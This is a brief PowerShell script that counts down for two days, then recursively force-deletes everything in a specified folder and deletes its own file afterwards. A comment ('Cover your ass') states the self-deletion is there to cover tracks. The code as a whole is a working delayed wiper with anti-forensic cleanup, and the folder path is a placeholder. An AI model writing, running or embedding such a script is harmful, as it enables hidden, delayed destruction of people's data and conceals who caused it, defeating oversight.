# Calculate the date and time 2 days
$endTime = (Get-Date).AddDays(2)

# Loop until the current time reaches the end time
while ((Get-Date) -lt $endTime) {
    # Calculate the remaining time
    $remainingTime = New-TimeSpan -Start (Get-Date) -End $endTime

    # Display remaining time
    Write-Host "Script will resume in $($remainingTime.Days) days, $($remainingTime.Hours) hours, $($remainingTime.Minutes) minutes, and $($remainingTime.Seconds) seconds."

    # Wait for 1 minute before checking again
    Start-Sleep -Seconds 60
}
# Continue with deletion commands

# Specify the folder path
$folderPath = "C:\Path\To\Your\Folder"

# Delete all items in the folder recursively
Remove-Item -Path $folderPath\* -Recurse -Force


# Get the full path of the script
$scriptPath = $MyInvocation.MyCommand.Path

# Define a delay before deletion (in seconds)
$delaySeconds = 5

# Wait for the specified delay
Start-Sleep -Seconds $delaySeconds

# Cover your ass, script deletes itself
Remove-Item -Path $scriptPath -Force
